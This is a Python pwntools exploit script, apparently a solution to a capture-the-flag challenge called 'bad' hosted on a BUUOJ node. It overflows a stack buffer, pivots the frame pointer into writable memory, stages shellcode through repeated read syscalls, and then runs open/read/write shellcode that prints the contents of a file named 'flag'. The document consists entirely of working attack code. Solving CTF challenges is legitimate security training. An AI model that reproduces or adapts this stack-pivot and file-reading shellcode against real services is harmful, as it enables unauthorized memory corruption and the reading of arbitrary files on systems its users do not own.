# coding:utf-8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
 
# sh = process('bad')
sh = remote('node4.buuoj.cn', 28493)
elf = ELF('./bad')
 
def Send(exp):
	sh.recvuntil('Easy shellcode, have fun!\n')
	sh.send(exp)
 
#gdb.attach(sh, 'break *0x400a49')
 
buf = 0x601000+0x300
exp = 'A'*0x20				#padding
exp+= p64(buf)				#rbp
exp+= p64(0x400A28)			#read(0, $rbp-0x20 = 0x6012e0, 0x38)
exp+= 'A'*8
Send(exp)					
 
exp = asm('xor rax, rax')	#read(0, 0x601300, 0x64), rsp = 0x601310, rip = 0x6012e0
exp+= asm('xor rdi, rdi')
exp+= asm('mov rsi, 0x601300')
exp+= asm('mov rdx, 0x64')
exp+= asm('syscall')
 
exp = exp.ljust(0x20, asm('nop'))
exp+= p64(0)				#0x601300	leave
exp+= p64(0x6012e0)			#0x601308	ret
exp+= 'A'*8					#len(exp) must be 0x38
sh.send(exp)
 
sh.recvuntil('Baddd! Focu5 me! Baddd! Baddd!\n')
 
exp = asm('xor rax, rax')	#read(0, 0x601400, 0x100)
exp+= asm('xor rdi, rdi')
exp+= asm('mov rsi, 0x601400')
exp+= asm('mov rdx, 0x100')
exp+= asm('syscall')
 
exp+= asm('mov rax, 0x2')	#open(0x601400, 0, 0)
exp+= asm('mov rdi, 0x601400')
exp+= asm('xor rsi, rsi')
exp+= asm('xor rdx, rdx')
exp+= asm('syscall')
 
exp+= asm('xor rax, rax')	#read(3, 0x601500, 0x100)
exp+= asm('mov rdi, 0x3')
exp+= asm('mov rsi, 0x601500')
exp+= asm('mov rdx, 0x100')
exp+= asm('syscall')
 
exp+= asm('mov rax, 0x1')	#write(1, 0x601500, 0x100)
exp+= asm('mov rdi, 0x1')
exp+= asm('mov rsi, 0x601500')
exp+= asm('mov rdx, 0x100')
exp+= asm('syscall')
 
sh.send(exp)
sh.send('flag\x00')
 
sh.interactive()